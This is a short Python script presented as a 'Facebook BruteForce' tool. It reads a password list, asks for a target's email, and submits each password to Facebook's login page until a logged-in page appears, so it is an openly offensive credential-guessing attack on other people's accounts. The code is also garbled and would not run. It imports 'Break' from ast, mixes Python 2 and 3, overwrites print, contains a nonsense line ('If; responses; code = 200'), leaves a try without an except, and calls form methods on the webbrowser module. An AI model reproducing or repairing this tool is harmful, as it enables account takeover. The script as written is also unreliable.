import sys
from ast import Break
import webbrowser
import time
if sys.version_info[0] !=2: 
	print('''--------------------------------------
	REQUIRED PYTHON 2
	use: python fb.py
--------------------------------------
			''')
	Break
print('\n-------- follow on FB @CYBERHACKS6--------\n')

post_url='https://www.facebook.com/login.php'
headers = {
	'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
}


print('\n---------- Welcome To Facebook BruteForce ----------\n')
file=open('passwords.txt','r')

email = input("input Email of target:")
print ("\nTarget Email ID : ",email+"")
print ("\nTrying Passwords from list ")
i=0
while file:
	passwords=file.readline().strip()
	i+=1
	if len(passwords) < 6:
		continue
	print=str(i) +" : ",passwords
	response = webbrowser.open(post_url)
	try:
	                If; responses; code = 200
			webbrowser.select_form(nr=0)
			webbrowser.form['email'] = email
			webbrowser.form['pass'] = passwords
			response = webbrowser.submit()
			response_data = response.read()
			if 'Find Friends' in response_data or 'Two-factor authentication' in response_data or 'security code' in response_data:
				print('Your password is : ',passwords)
				break
sys.exit()
